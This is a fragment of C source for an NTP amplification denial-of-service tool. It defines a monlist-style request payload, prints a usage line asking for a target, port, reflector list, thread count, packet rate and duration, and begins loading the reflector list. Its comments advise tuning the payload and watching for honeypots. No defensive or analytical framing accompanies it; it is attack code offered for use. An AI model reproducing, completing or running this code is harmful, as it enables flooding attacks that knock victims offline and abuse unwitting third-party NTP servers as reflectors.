...
static const char PAYLOAD[] = "\x17\x00\x03\x2a\x00\x00\x00\x00";//payload is bad 
    //change payload for BETTER OPTIMIZATION
    //chearch on honeypot
...
int main(int argc, char *argv[]) {
  if (argc < 6) {
    fprintf(stderr, "NTP AMPLIFICATION PORT 123\n");
    fprintf(stdout, "%s <TARGET> PORT <LIST.TXT> <THREADS> <PPS> <TIME>\n",argv[0]);
    exit(-1);
  }
  srand(time(NULL));
  int i = 0;
  head = NULL;
  fprintf(stdout, "Loading list..\n");
  int max_len = 512;
